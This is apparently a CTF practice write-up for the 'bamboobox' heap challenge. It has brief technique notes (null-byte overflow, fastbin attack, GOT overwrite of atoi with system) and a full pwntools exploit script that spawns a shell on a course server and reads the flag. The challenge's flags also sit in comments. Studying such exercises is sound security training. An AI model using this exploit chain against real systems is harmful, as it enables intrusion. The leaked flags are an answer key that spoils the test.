# Week 6 practice
## bamboobox 1 & 2 100
* One byte overflow -> `Heap overlap`.
* Fake fd for `fastbin attack`.
* Modify data pointer of `struct item itemlist[100]` on bss.
* Leak Libc and got hijacking.
* `atoi()` -> `system`.
* `atio('sh')` -> `system(sh)`.

```python
#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# FLAG{NOOO~YOUFOUNDME!!} flag 2
# FLAG{DO_Y0U_LIKE_BAMB00??} flag 1

context.arch = 'amd64'

e , l = ELF('./bamboobox') , ELF('./libc.so.6')

host , port = 'csie.ctf.tw' , 10138

y = remote(host,port)
#y = process( './bamboobox' , env = {'LD_PRELOAD':'./libc.so.6'} )
#y = process( './bamboobox' )
#print util.proc.pidof(y)
#raw_input('>')


def add( size , data ):
    y.sendafter( 'ice:' , '2' )
    y.sendafter( 'e:' , str( size ) )
    y.sendafter( 'm:' , data )

def chg( idx , size , data ):
    y.sendafter( 'ice:' , '3' )
    y.sendafter( ':' , str( idx ) )
    y.sendafter( 'e:' , str( size ) )
    y.sendafter( 'm:' , data )

def sho():
    y.sendafter( 'ice:' , '1' )

def dle( idx ):
    y.sendafter( 'ice:' , '4' )
    y.sendafter( ':' , str( idx ) )



add( 0x71 , 'a' * 0x70 )   # 0
add( 0x200 , 'A' * 0x200 ) # 1
add( 0x200 , 'B' * 0x200 ) # 2
add( 0x200 , 'C' * 0x200 ) # 3
add( 0x200 , 'D' * 0x200 ) # 4

dle( 2 )

dle( 1 )
add( 0x208 , 'A' * 0x200 + p64( 0 ) ) # 1 # Null byte

add( 0x100 , '1' * 0x100 ) # 2
add( 0x68 , '2' * 0x60 ) # 5

dle( 2 )
dle( 3 )

add( 0x410 , 'D' ) # 2
dle( 5 )
chg( 2 , 0x400 , 'D' * 0x100 + p64( 0x0 ) + p64( 0x71 ) + p64( 0x6020c0 - 8 )  )

add( 0x68 , 'get' )
add( 0x68 , p64( e.got['__libc_start_main'] ) + 'DDDDDDDD' + p64( e.got['atoi'] ) )

sho()

y.recvuntil( '0 : ' )
l.address += u64( y.recv( 6 ).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
log.success( 'libc -> %s' % hex( l.address ) )

chg( 1 , 8 , p64( l.symbols['system'] ) )

y.sendline( 'sh' )

sleep(0.7)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()
```